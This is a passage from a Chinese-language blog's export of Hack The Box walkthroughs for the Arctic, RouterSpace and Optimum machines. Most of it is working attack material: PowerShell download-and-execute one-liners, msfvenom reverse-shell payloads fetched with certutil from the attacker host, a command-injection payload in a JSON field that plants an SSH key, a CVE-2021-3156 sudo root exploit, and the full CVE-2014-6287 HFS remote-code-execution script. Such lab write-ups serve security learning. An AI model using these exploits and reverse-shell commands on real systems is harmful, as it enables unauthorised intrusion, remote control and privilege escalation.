(http://0.0.0.0:80/) ... 开启一个 HTTP 服务器 powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.4/exploit.html&#39;)&quot; 在我们的 shell 里使用 powershell 下载刚才的 shell 但是最后我还是失败了 成功的方法┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic] └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=5555 -f exe &gt; exploit.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of exe file: 73802 bytes 使用 msfvenom 生成一个 exe 的 payload msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp 然后在 msf 里使用上面的模块 msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target 然后修改一下 msf 的配置文件 msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.4 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target 设置好以后开始监听 msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe 使用上面的命令进行下载 exploit.exe ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49738 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe certutil.exe -urlcache -split -f &quot;http://10.10.16.4/exploit.exe&quot; exploit.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. 成功下载 然后运行一下 C:\\ColdFusion8\\runtime\\bin&gt;exploit.exe exploit.exe msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.4:5555 [*] Sending stage (175174 bytes) to 10.10.10.11 [*] Meterpreter session 1 opened (10.10.16.4:5555 -&gt; 10.10.10.11:49746) at 2022-03-24 04:31:53 -0400 meterpreter &gt; getuid Server username: ARCTIC\\tolis 成功用 msf 拿到了 shell Root使用 ms10-059 https://github.91chi.fun/https://github.com/LucifielHack/windows-kernel-exploits-1.git 然后使用 certutil 将我们的 Chimichurri.exe 下载进去 certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe 然后使用 nc 监听一个端口 ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 5555 listening on [any] 5555 ... C:\\ColdFusion8\\runtime\\bin&gt;certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe certutil.exe -urlcache -split -f &quot;http://10.10.16.4/Chimichurri.exe&quot; Chimichurri.exe **** Online **** 000000 ... 0bf800 CertUtil: -URLCache command completed successfully. ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 5555 listening on [any] 5555 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49208 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\ColdFusion8\\runtime\\bin&gt;whoami whoami nt authority\\system 成功拿到 system 权限 C:\\Users\\Administrator\\Desktop&gt;type c:\\users\\administrator\\desktop\\root.txt type c:\\users\\administrator\\desktop\\root.txt fa6be5a3ab5fb06b70586f96932c3e09 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"RouterSpace - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-RouterSpace","date":"2022-03-25T11:38:36.000Z","updated":"2023-06-13T03:49:47.000Z","comments":true,"path":"2022/03/25/Hackthebox/Easy/Hackthebox-RouterSpace/","link":"","permalink":"http://www.lucifiel.com/2022/03/25/Hackthebox/Easy/Hackthebox-RouterSpace/","excerpt":"","text":"Hackthebox - RouterSpace靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.148 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 21:16 EST Nmap scan report for 10.10.11.148 Host is up (0.28s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-76343 | Content-Type: text/html; charset=utf-8 | Content-Length: 78 | ETag: W/&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4&quot; | Date: Mon, 28 Feb 2022 02:17:00 GMT | Connection: close | Suspicious activity detected !!! {RequestID: j7Q X53 Qp3 9o 7 B2JL } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-10824 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/&quot;652c-17d476c9285&quot; | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: Mon, 28 Feb 2022 02:16:56 GMT | Connection: close | &lt;!doctype html&gt; | &lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt; | &lt;title&gt;RouterSpace&lt;/title&gt; | &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; | &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt; | &lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-97983 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot; | Date: Mon, 28 Feb 2022 02:16:57 GMT | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port22-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(NULL SF:,29,&quot;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.91%I=7%D=2/27%Time=621C309D%P=x86_64-pc-linux-gnu%r(GetR SF:equest,13E4,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\n SF:X-Cdn:\\x20RouterSpace-10824\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control SF::\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x20202 SF:1\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\&quot;652c-17d476c9285\\&quot;\\r\\nContent-Type SF::\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x SF:20Mon,\\x2028\\x20Feb\\x202022\\x2002:16:56\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20class=\\&quot;no-js\\&quot;\\x20lang=\\&quot;zxx\\&quot;&gt;\\n&lt; SF:head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;me SF:ta\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&gt;\\n\\x20\\x20\\ SF:x20\\x20&lt;title&gt;RouterSpace&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;desc SF:ription\\&quot;\\x20content=\\&quot;\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\&quot;viewport\\&quot;\\ SF:x20content=\\&quot;width=device-width,\\x20initial-scale=1\\&quot;&gt;\\n\\n\\x20\\x20\\x20\\ SF:x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/bootstrap\\.min\\.css\\&quot;&gt;\\n\\x SF:20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/owl\\.carousel\\. SF:min\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/ SF:magnific-popup\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20 SF:href=\\&quot;css/font-awesome\\.min\\.css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\&quot;st SF:ylesheet\\&quot;\\x20href=\\&quot;css/themify-icons\\.css\\&quot;&gt;\\n\\x20&quot;)%r(HTTPOptions,10 SF:8,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20 SF:RouterSpace-97983\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20text/h SF:tml;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\&quot;d-bMedpZ SF:YGrVt1nR4x\\+qdNZ2GqyRo\\&quot;\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x202022\\x2002:16 SF::57\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST&quot;)%r(RTSPRequest SF:,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:&quot;)%r(X11Probe,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20 SF:close\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,134,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Po SF:wered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-76343\\r\\nContent-Type SF::\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2078\\r\\nETag:\\x20W SF:/\\&quot;4e-iLIX7S/AlC0nyhqE0lYp8aZLlm4\\&quot;\\r\\nDate:\\x20Mon,\\x2028\\x20Feb\\x2020 SF:22\\x2002:17:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20acti SF:vity\\x20detected\\x20!!!\\x20{RequestID:\\x20j7Q\\x20\\x20X53\\x20Qp3\\x20\\x20 SF:9o\\x207\\x20\\x20\\x20B2JL\\x20\\x20}\\n\\n\\n\\n\\n&quot;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: VoIP adapter|general purpose Running: Cisco embedded, Linux 2.6.X OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.6.26 OS details: Cisco Unified Communications Manager VoIP adapter, Linux 2.6.26 (PCLinuxOS) TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 ... 30 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 287.18 seconds Http先去看看80端口 这似乎是一个公寓的路由管理系统 先到处看看 这里右上角Download会下载一个apk包，下载下来后使用模拟器运行然后burp抓包看看 Apk https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd 在Debian架构的Linux中安装AnBox模拟器的方法 anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity 安装后以后咱们启动模拟器 adb shell settings put global http_proxy 192.168.31.208:8080 然后burp设置好监听端口以后，使用burp对anbox进行代理 adb install RouterSpace.apk 安装app，然后打开 APK文件运行后就只有一个查看状态的按钮，我们抓包看看 POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1 accept: application/json, text/plain, */* user-agent: RouterSpaceAgent Content-Type: application/json Content-Length: 16 Host: routerspace.htb Connection: close Accept-Encoding: gzip, deflate {&quot;ip&quot;:&quot;0.0.0.0&quot;} 将routerspace.htb加入到hosts echo 10.10.11.148 routerspace.htb &gt;&gt; /etc/hosts 抓包下来后是这么个状态，去放包看看 这边我有个大胆的想法，看着跟DVWA的命令注入很类似，去测试一下是否可行 成功被执行了，那就好玩了，去构造POC拿shell吧 漏洞利用 尝试写入文件，但是无法执行成功 试试能不能执行命令 调用bash也失败了 然后在&#x2F;home&#x2F;paul&#x2F;.ssh&#x2F;里也没有东西，但是经过测试后，.ssh里可以写入文件 这里突然就有个思路了，生成一个sshkey，然后写入进去就可以ssh登陆了 ssh-keygen 然后全部默认即可生成 然后把id_rsa.pub的内容保存为authorized_keys {&quot;ip&quot;:&quot;0.0.0.0|echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMxVRUf56TSx5tkTab+gCMuO3EFgbMTbNlLOhqEvLiDLcST6zbYl0ofc4cGNguoi6ti6iyi8ZHyS8DjJ89thmpTrDiYXf39Z8QhkO2DaQkzh6FjvvGgY82pVBPtRq1qL0JrnOgqhGBigs3kPbd0kkdmOmDbmV1w1p9omfk2Tj/+q469S+1IVCtQIIvtNuuGTUeTMYQdCfFLOB4OVHBLvAuucIagK2DJrJLgcf0w/DQ/9X04luqhqQET8SfQqBpfn1nq/CcJvXsMlCGqbjE4m6c5l4WIaeAtfrhUdrVukSg0x/r1OJvEm4MgevR7eN/umwGP6yQVH34eBoTHoU6P+H3+9csDAMujbSCWJi3yGK9U5Q7Rei0DsiCrd6T0qbQuCmu4bUdJZfSZCGPCSxO7LRCQlNI13RLRTTUPh6cQn7eB+bnucs/YRgx2/O4b+EDsWGEveXQTpfbJxYLMeespC95v5Rj/vl1C3zqq2nIUIqXC13Y+966+92x4Y6vVmaKDC0= root@kali&#39; &gt; /home/paul/.ssh/authorized_keys&quot;} 然后给700权限 {&quot;ip&quot;:&quot;0.0.0.0|chmod 700 /home/paul/.ssh/authorized_keys&quot;} 然后使用ssh进行登陆 ┌──(root💀kali)-[~/Desktop] └─# ssh paul@10.10.11.148 -i id_rsa The authenticity of host &#39;10.10.11.148 (10.10.11.148)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:M4jDfH65U/Fw7jjmKhTZcb9LgW/gi23OjcLjM1bA5UY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.148&#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 03 Mar 2022 11:30:25 AM UTC System load: 0.07 Usage of /: 71.7% of 3.49GB Memory usage: 31% Swap usage: 0% Processes: 214 Users logged in: 0 IPv4 address for eth0: 10.10.11.148 IPv6 address for eth0: dead:beef::250:56ff:feb9:888d 80 updates can be applied immediately. 31 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Mar 2 22:54:39 2022 from 10.10.14.27 paul@routerspace:~$ whoami&amp;&amp;id paul uid=1001(paul) gid=1001(paul) groups=1001(paul) 成功拿到user权限 paul@routerspace:~$ ls snap user.txt paul@routerspace:~$ cat user.txt a874812f3d7207b3f4ad32da4bc2bc84 成功拿到user权限的flag文件 权限提升首先去跑一个linpeas.sh脚本看看有没有提权点 https://github.com/LucifielHack/linpeas.sh/blob/main/linpeas.sh [+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.31 跑完以后我看到了这么个东西，然后去搜索一下sudo 1.8.31的漏洞 这里看到了一个漏洞CVE-2021-3156 https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1001(paul) 成功拿到root权限的flag文件 # cat /root/root.txt f3388fc86d949870742895a2c1d6f16e 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Optimum - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Optimum","date":"2022-03-10T11:38:36.000Z","updated":"2023-06-13T03:48:20.000Z","comments":true,"path":"2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/","link":"","permalink":"http://www.lucifiel.com/2022/03/10/Hackthebox/Easy/Hackthebox-Optimum/","excerpt":"","text":"Hackthebox - Optimum靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.8 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-09 23:06 EST Nmap scan report for 10.10.10.8 Host is up (0.52s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (85%) OS CPE: cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 477.43 ms 10.10.16.1 2 477.52 ms 10.10.10.8 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.98 seconds Http只有一个80端口开着，去看看HTTP的内容 这似乎是一个文件服务器，试试有没有弱口令可以登录的 测试了几个弱口令，都没登录进去，看看其他方法 这里可以看到有一个HttpFileServer 2.3，去searchsploit一下看看有没有相关的漏洞 Searchsploit┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# searchsploit HttpFileServer 2.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这里确实有一个RCE，测试一下是否可用 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# cat CVE-2014-6287.py # Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) # Google Dork: intext:&quot;httpfileserver 2.3&quot; # Date: 28-11-2020 # Remote: Yes # Exploit Author: Óscar Andreu # Vendor Homepage: http://rejetto.com/ # Software Link: http://sourceforge.net/projects/hfs/ # Version: 2.3.x # Tested on: Windows Server 2008 , Windows 8, Windows 7 # CVE : CVE-2014-6287 #!/usr/bin/python3 # Usage : python3 Exploit.py &lt;RHOST&gt; &lt;Target RPORT&gt; &lt;Command&gt; # Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 &quot;c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.4/shells/mini-reverse.ps1&#39;)&quot; import urllib3 import sys import urllib.parse try: http = urllib3.PoolManager() url = f&#39;http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}&#39; print(url) response = http.request(&#39;GET&#39;, url) except Exception as ex: print(&quot;Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command&quot;) print(ex) 尝试执行一下 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# python3 CVE-2014-6287.py 10.10.10.8 80 whoami http://10.10.10.8:80/?search=%00{.+exec|whoami.} 这里没有给我任何回显，我不确定是否执行成功了，去测试一下吧 本地使用tcpdump监听一下网卡，然后执行一下ping我们自己的命令 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;ping 10.10.16.3&quot; http://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.16.3.} ┌──(root💀kali)-[~/Desktop] └─# tcpdump -i tun0 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 23:25:22.516278 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [S], seq 2814804000, win 64240, options [mss 1460,sackOK,TS val 3571996960 ecr 0,nop,wscale 7], length 0 23:25:22.747740 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [S.], seq 3736611079, ack 2814804001, win 8192, options [mss 1355,nop,wscale 8,sackOK,TS val 122838 ecr 3571996960], length 0 23:25:22.747788 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 0 23:25:22.747968 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [P.], seq 1:143, ack 1, win 502, options [nop,nop,TS val 3571997191 ecr 122838], length 142: HTTP: GET /?search=%00%7B.+exec%7Cping%2010.10.16.3.%7D HTTP/1.1 23:25:23.203303 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1:219, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 218: HTTP: HTTP/1.1 200 OK 23:25:23.203352 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.203376 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 219:1562, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP 23:25:23.203381 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1562, win 498, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.204028 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 1562:1679, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP 23:25:23.204036 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 3571997647 ecr 122884], length 0 23:25:23.434280 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], seq 1679:3022, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1343: HTTP 23:25:23.434317 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3022, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.434339 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3022:3139, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 117: HTTP 23:25:23.434346 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.434354 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [P.], seq 3139:4164, ack 143, win 257, options [nop,nop,TS val 122884 ecr 3571997191], length 1025: HTTP 23:25:23.434359 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4164, win 498, options [nop,nop,TS val 3571997878 ecr 122884], length 0 23:25:23.437193 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [F.], seq 143, ack 4164, win 501, options [nop,nop,TS val 3571997881 ecr 122884], length 0 23:25:23.879455 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [.], ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0 23:25:24.151025 IP 10.10.10.8.http &gt; 10.10.16.3.35656: Flags [F.], seq 4164, ack 144, win 257, options [nop,nop,TS val 122953 ecr 3571997881], length 0 23:25:24.151044 IP 10.10.16.3.35656 &gt; 10.10.10.8.http: Flags [.], ack 4165, win 501, options [nop,nop,TS val 3571998595 ecr 122953], length 0 23:25:47.421881 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:48.422841 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:49.424354 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 23:25:50.425946 IP 10.10.16.3.33237 &gt; 239.255.255.250.1900: UDP, length 172 确实是成功被执行了，那就可以确认该漏洞是存在，并且exploit也是可以使用的 漏洞利用方法 1既然知道了什么漏洞可以用，那就简单了，来构造POC吧 根据CVE-2014-6287的提示，这里应该是使用powershell进行回弹一个shell，咱们找一个powershell的利用工具 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 我这边是找到一个脚本，咱们给下载下来，然后去尝试执行 然后稍微修改一下 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 我们将这句代码复制下来，粘贴到代码最底部，然后把IP修改为我们自己的IP 然后在本地使用python3开启一个http服务 python3 -m http.server 80 然后使用exp进行下载 ┌──(root💀kali)-[~/Desktop/HTB/Easy/Optimum] └─# python3 CVE-2014-6287.py 10.10.10.8 80 &quot;c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.3/Invoke-PowerShellTcp.ps1&#39;)&quot; http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.16.3/Invoke-PowerShellTcp.ps1%27%29.} PS C:\\Users\\kostas\\Desktop&gt; whoami optimum\\kostas 成功得到了shell 方法 2msf6 &gt; search HttpFileServer 2.3 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec msf6 &gt; use 0 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msfconsole可以直接使用 msf6 exploit(windows/http/rejetto_hfs_exec) &gt; show options Module options (exploit/windows/http/rejetto_hfs_exec): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 no Seconds to wait before terminating web server Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.8 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The path of the web application URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST 10.10.16.3 yes The listen address (an interface may be specified) LPORT 5555 yes The listen port Exploit target: Id Name -- ---- 0 Automatic 设置好相关配置，然后执行 msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.16.3:5555 [*] Using URL: http://0.0.0.0:8080/zKFWDMqMmVKxA [*] Local IP: http://192.168.200.128:8080/zKFWDMqMmVKxA [*] Server started. [*] Sending a malicious request to / [*] Payload request received: 